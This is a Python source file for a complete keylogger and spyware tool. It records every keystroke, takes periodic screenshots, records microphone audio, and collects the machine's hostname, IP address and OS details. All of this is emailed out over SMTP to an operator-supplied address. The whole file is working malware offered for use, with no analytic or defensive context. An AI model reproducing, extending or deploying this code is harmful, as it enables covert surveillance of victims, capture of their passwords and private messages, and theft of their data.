from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import pyscreenshot as ImageGrab
import threading
import platform
import socket
import smtplib
import os
import time
import sounddevice as sd
from scipy.io.wavfile import write
import asyncio
from multiprocessing import Process

class Keylogger:

    def __init__(self):
        self.log ="Keylogger started ..."
        self.interval = 40
        self.email="" # your email address here
        self.password = "" # your password here
        self.comp_info = "system-info.txt"
        self.screen = "screenshot.png"
        self.cwd=os.getcwd()
        self.extend="\\"
        self.count = 0
        self.audio_inf ="audio.wav"
        self.seconds = 30
        self.lock = threading.Lock()

    def get_computer_info(self):
        with open(self.comp_info,'w') as f:
            hostname = socket.gethostname()
            ip= socket.gethostbyname(hostname)

            f.write("Processor: " + (platform.processor() + "\n"))
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("IP Address: " + ip + "\n")

        self.send_mail(self.comp_info, self.comp_info)
        os.remove(self.cwd + self.extend + self.comp_info)
    async def get_audio(self):
        while True:
            await asyncio.sleep(40)
            fs = 44100  # Sample rate
            seconds = self.seconds  # Duration of recording
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()  # Wait until recording is finished
            write(self.cwd + self.extend + self.audio_inf, fs, myrecording)  # Save as WAV file
            self.lock.acquire()
            self.send_mail(self.audio_inf, self.cwd + self.extend + self.audio_inf)
            self.lock.release()
            os.remove(self.cwd + self.extend + self.audio_inf)
    async def get_screenshot(self):
       while True:
           await asyncio.sleep(30)
           image = ImageGrab.grab()
           image.save(self.cwd + self.extend + self.screen)
           self.lock.acquire()
           self.send_mail(self.screen, self.cwd + self.extend + self.screen)
           self.lock.release()
           self.count += 1
           os.remove(self.cwd + self.extend + self.screen)

    def send_mail(self,  filename, attachment):
        fromaddress=self.email
        toaddress=self.email
        # server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
        # server.starttls()
        # server.login(self.email, self.password)
        # server.sendmail(self.email, self.email, self.message)
        # server.quit()

        msg=MIMEMultipart()
        # storing the senders email address
        msg['From'] = fromaddress

        # storing the receivers email address
        msg['To'] = toaddress

        # storing the subject
        msg['Subject'] = "Log File"

        # string to store the body of the mail
        body = "Body_of_the_mail"
        # attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))

        # open the file to be sent
        filename = filename
        attachment = open(attachment, "rb")

        # instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')

        # To change the payload into encoded form
        p.set_payload((attachment).read())

        # encode into base64
        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        # attach the instance 'p' to instance 'msg'
        msg.attach(p)
        server = smtplib.SMTP('smtp.live.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        # Converts the Multipart msg into a string
        text = msg.as_string()
        # sending the mail
        server.sendmail(fromaddress, toaddress, text)
        # terminating the session
        server.quit()


    def append_to_log(self, key):
        self.log = self.log + str(key)
    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key =" "+ str(key)+ " "

        #print(current_key)
        self.append_to_log(current_key)

    def report(self):
        #print(str(self.log)) #debugging
        self.send_logs('\n\n'+ self.log)
        self.log=""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_logs(self, message):
        server = smtplib.SMTP('smtp.live.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()


    def run(self):
        self.get_computer_info()
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            print("----| No Errors :=) |------")
            loop = asyncio.get_event_loop()
            asyncio.ensure_future(self.get_screenshot())
            asyncio.ensure_future((self.get_audio()))
            loop.run_forever()

            #self.screenshot()
            #self.call_audio()
            keyboard_listener.join()


keylogger = Keylogger()
keylogger.run()
#print("hello world")
#keylogger.get_computer_info()
#keylogger.screenshot()

